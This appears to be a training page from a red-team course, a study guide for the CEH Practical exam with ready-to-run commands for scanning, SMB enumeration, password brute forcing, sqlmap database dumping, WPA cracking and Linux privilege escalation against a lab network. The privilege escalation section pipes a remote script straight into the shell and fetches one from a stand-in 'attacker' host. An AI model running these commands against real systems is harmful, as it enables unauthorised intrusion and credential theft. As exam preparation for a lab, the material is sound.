---
layout: training-page
title: "CEH Practical Exam Guide — Red Team Academy"
module: "Fundamentals"
tags:
  - ceh
  - certification
  - practical-exam
  - methodology
  - tools
page_key: "fundamentals-ceh-practical"
render_with_liquid: false
---

# CEH Practical Exam Guide

The Certified Ethical Hacker (Practical) exam is a 6-hour, hands-on cyber range where candidates must compromise five machines on an isolated network. Unlike the multiple-choice CEH theory exam, this tests actual offensive skills in a live environment. Minimum passing score: 15 of 20 challenges.

## Exam Format

```
Duration:        6 hours
Challenges:      20 practical questions
Platform:        EC-Council iLabs via CyberQ browser
Environment:     ParrotOS (attack) + Windows 11 machine
Target network:  5 machines, isolated from internet
Minimum pass:    15 correct answers
Search allowed:  Yes (Google is permitted)
Communication:   No talking to others during exam
```

## Core Exam Topics

- Network scanning — identify live hosts and open services
- OS banner grabbing and service/user enumeration
- System hacking — password cracking, hash dumping
- Steganography — hide and extract data from images/audio
- SQL injection attacks
- Vulnerability analysis and exploitation
- Packet sniffing and PCAP analysis
- Cryptography attacks
- Computer forensics basics

## Required Tool Knowledge

```
# Network Scanning
nmap            # Port scanning, service detection, OS fingerprinting
netdiscover     # ARP-based host discovery

# Enumeration
enum4linux      # SMB/Windows enumeration
smbclient       # SMB share access
rpcdump         # RPC endpoint enumeration
dcomcnfg        # DCOM configuration inspection
gacutil         # .NET assembly inspection
strings         # Extract printable strings from binaries

# Exploitation
metasploit      # Framework for exploit execution
searchsploit    # Exploit-DB offline search

# Password Attacks
hydra           # Online brute force (HTTP, SSH, FTP, SMB)
john            # Offline hash cracking with wordlists
hashcat         # GPU-accelerated hash cracking
crunch          # Custom wordlist generation
cewl            # Crawl website to generate target wordlist
rainbow crack   # Rainbow table attacks
hashcalc        # Hash calculation utility

# Web Application
nikto           # Web server vulnerability scanner
wpscan          # WordPress vulnerability scanner
sqlmap          # Automated SQL injection
dirb            # Directory brute force

# Wireless
aircrack-ng     # WPA/WEP cracking from captured handshakes

# Steganography
steghide        # Hide/extract data in JPEG, BMP, WAV files
openstego       # GUI steganography tool (LSB embedding)
quickstego      # Quick steg tool for images

# Forensics / Analysis
ftk imager      # Disk image acquisition and analysis
malwoverview    # Malware triage and analysis
radare2         # Reverse engineering framework
gdb             # GNU debugger for binary analysis
sandfly-entropyscan  # Detect packed/encrypted files by entropy
exiftool        # Read/write file metadata

# Privilege Escalation
linpeas         # Linux privilege escalation enumeration
gtfobins        # Bypass restricted shells via misconfigs

# Encryption
veracrypt       # Volume/file encryption

# Packet Analysis
wireshark       # GUI packet capture and analysis
tcpdump         # CLI packet capture
```

## Network Scanning Methodology

```
# Discover live hosts
netdiscover -r 10.10.10.0/24
nmap -sn 10.10.10.0/24

# Full port scan with service versions
nmap -sV -sC -p- 10.10.10.0/24 -oN scan.txt

# OS detection
nmap -O 10.10.10.5

# Aggressive scan (OS + version + scripts + traceroute)
nmap -A 10.10.10.5

# Specific service enumeration
nmap -p 445 --script smb-enum-users 10.10.10.5
nmap -p 445 --script smb-enum-shares 10.10.10.5

# Common exam questions answered via nmap
# "What is the version of the Linux kernel?" → nmap -O + uname -r after shell
# "How many Windows machines?"              → nmap -O 10.10.10.0/24 | grep Windows
# "What is the IP of machine X?"            → nmap -sn range, look for hostname/service
```

## SMB Enumeration

```
# Full SMB enumeration
enum4linux -a 10.10.10.5

# List shares
smbclient -L //10.10.10.5 -N
smbclient -L //10.10.10.5 -U username

# Connect to share
smbclient //10.10.10.5/SHARENAME -U username

# Enumerate users via RPC
rpcclient -U "" 10.10.10.5
  > enumdomusers
  > queryuser <RID>

# FQDN of Domain Controller
nmap -p 389 --script ldap-rootdse 10.10.10.5
# Or via enum4linux — look for "Domain:" field
```

## Password Attacks

```
# Hydra — online brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.5 ssh
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.5 ftp
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.5 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid"

# Generate custom wordlist from target website
cewl http://10.10.10.5 -m 6 -w wordlist.txt

# Generate numeric/pattern wordlists
crunch 8 8 0123456789 -o pins.txt
crunch 6 6 abcdefghijklmnopqrstuvwxyz -o lower6.txt

# John the Ripper — offline cracking
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hashes.txt --rules --wordlist=/usr/share/wordlists/rockyou.txt
john --show hashes.txt   # Show cracked passwords

# Hashcat — GPU accelerated
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt    # MD5
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt  # NTLM
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt  # sha512crypt

# Common hash modes
# 0    = MD5
# 100  = SHA1
# 1000 = NTLM
# 1800 = sha512crypt (Linux /etc/shadow)
# 3200 = bcrypt
```

## SQL Injection

### SQLMap Usage

```
# Basic injection test
sqlmap -u "http://10.10.10.5/page?id=1"

# Enumerate databases
sqlmap -u "http://10.10.10.5/page?id=1" --dbs

# Enumerate tables in a database
sqlmap -u "http://10.10.10.5/page?id=1" -D dbname --tables

# Dump a specific table
sqlmap -u "http://10.10.10.5/page?id=1" -D dbname -T tablename --dump

# POST request injection
sqlmap -u "http://10.10.10.5/login" --data="user=admin&pass=1234" --dbs

# Bypass WAF with tamper scripts
sqlmap -u "http://10.10.10.5/page?id=1" --tamper=space2comment --dbs

# Automatic form detection
sqlmap -u "http://10.10.10.5/login" --forms --dbs
```

### SQL Injection Types

```
Union-based:      Use UNION operator to retrieve data from other tables
Error-based:      Force DB errors that reveal schema info
Blind:            No output — infer results from true/false responses
Time-based Blind: Infer results from response delay (SLEEP/WAITFOR)
Out-of-Band:      Exfiltrate data via DNS/HTTP to external server
Second Order:     Payload stored, triggered later by different query
Boolean-based:    Different responses for true vs false conditions
```

## Steganography

```
# Steghide — embed and extract from JPEG/BMP/WAV/AU
steghide embed -cf image.jpg -sf secret.txt -p password
steghide extract -sf image.jpg -p password
steghide info image.jpg   # Check if data is hidden

# OpenStego — GUI tool, LSB steganography
# Use for images where steghide fails

# Check image metadata (may reveal hints)
exiftool image.jpg

# Strings — find text hidden in binary files
strings suspicious.jpg | grep -i "flag\|pass\|secret"

# Check file type regardless of extension
file suspicious.jpg

# Common exam scenario: "What is the password hidden in the .jpeg file?"
# 1. Try steghide extract with empty password
# 2. Try common passwords: password, secret, admin, 123456
# 3. Use stegcracker with rockyou wordlist
stegcracker image.jpg /usr/share/wordlists/rockyou.txt
```

## Wireless — WPA Cracking

```
# Given a .cap file with WPA handshake:
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap

# If cap contains multiple networks, specify BSSID
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture.cap

# Rogue AP identification: look for deauth frames and probe responses
# Use Wireshark filter: wlan.fc.type_subtype == 0x000c  (deauth frames)
```

## Packet Analysis (Wireshark / Tcpdump)

```
# Open pcap in wireshark
wireshark capture.cap

# Useful filters for CEH exam scenarios:
# "Identify IoT Message using capture.cap"
mqtt                          # MQTT protocol filter (IoT)
coap                          # CoAP (Constrained Application Protocol)

# "Rogue AP" scenario
wlan.fc.type_subtype == 8     # Beacon frames (find all APs)
eapol                         # WPA handshakes

# Follow TCP streams to extract credentials
# Right-click packet → Follow → TCP Stream

# Tcpdump for quick capture analysis
tcpdump -r capture.cap -n
tcpdump -r capture.cap -n port 80
```

## Privilege Escalation

```
# Linux — run LinPEAS after getting a shell
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# Or transfer and run:
wget http://attacker/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh

# Check GTFOBINS for sudo/SUID escalation
# After seeing sudo -l output, search gtfobins.github.io

# Common Linux privesc checks
sudo -l                          # What can current user run as root?
find / -perm -u=s -type f 2>/dev/null   # SUID binaries
cat /etc/crontab                 # Scheduled tasks as root
cat /etc/passwd                  # Users list
uname -a                         # Kernel version for kernel exploits
```

## Forensics & Malware Analysis

```
# Entropy analysis — detect packed/encrypted files
sandfly-entropyscan -file suspicious.exe
# High entropy (close to 8.0) = likely packed/encrypted

# Get entry point of executable
objdump -f binary.exe | grep "start address"
# Or in radare2:
radare2 binary.exe
  > ie    # Print entry points

# Strings extraction
strings -n 8 binary.exe | head -50

# File hash calculation
md5sum file.exe
sha256sum file.exe
# In hashcalc (GUI) — open file, select algorithm

# FTK Imager — disk image analysis
# Mount image → browse file system → recover deleted files
```

## WordPress Scanning

```
# Basic scan
wpscan --url http://10.10.10.5/wordpress/

# Enumerate users
wpscan --url http://10.10.10.5/wordpress/ --enumerate u

# Brute force login
wpscan --url http://10.10.10.5/wordpress/ -U admin -P /usr/share/wordlists/rockyou.txt

# Enumerate plugins/themes with vulnerabilities
wpscan --url http://10.10.10.5/wordpress/ --enumerate p,t --api-token <TOKEN>
```

## Sample Exam Questions & Approaches

```
# "What is the IP of the Windows X machine?"
nmap -O 10.10.10.0/24 → filter by "Windows" in OS detection

# "What is the version of the Linux Kernel?"
After shell: uname -r
Remote: nmap -O --osscan-guess target

# "What is the password for user X of the FTP server?"
hydra -l userX -P rockyou.txt 10.10.10.5 ftp

# "What is user X's IBAN number / phone number?"
Look in database via sqlmap, or files accessible via SMB

# "What is the password hidden in the .jpeg file?"
steghide extract -sf image.jpg -p ""   # Try empty password first
stegcracker image.jpg rockyou.txt

# "Crack password using capture.cap"
aircrack-ng -w rockyou.txt capture.cap

# "Identify FQDN of Domain Controller"
nmap -p 389 --script ldap-rootdse target
enum4linux -a target | grep "Domain:"

# "Deep scan elf, obtain hash of file with highest entropy"
sandfly-entropyscan -dir /path/
sha256sum highest-entropy-file

# "Find executable entry point"
radare2 binary → ie
objdump -f binary | grep "start address"
```

## CEH Exam Resources

- EC-Council iLabs — practice environment — `ilabs.eccouncil.org`
- GTFOBins — Unix binaries for privesc — `gtfobins.github.io`
- SecLists — wordlists and payloads — `github.com/danielmiessler/SecLists`
- Hack The Box — practice machines (Easy/Medium) — `hackthebox.eu`
- TryHackMe — guided rooms — `tryhackme.com`
- CEH Exam Guide (Medium) — `medium.com/techiepedia/certified-ethical-hacker-practical-exam-guide-dce1f4f216c9`

## Resources

- Guide-CEH-Practical-Master — `github.com/CyberSecurityUP`
- MITRE ATT&CK — `attack.mitre.org`
- HackerTarget Nmap Cheatsheet — `hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/`
- SQLMap Tutorial — `hackertarget.com/sqlmap-tutorial/`
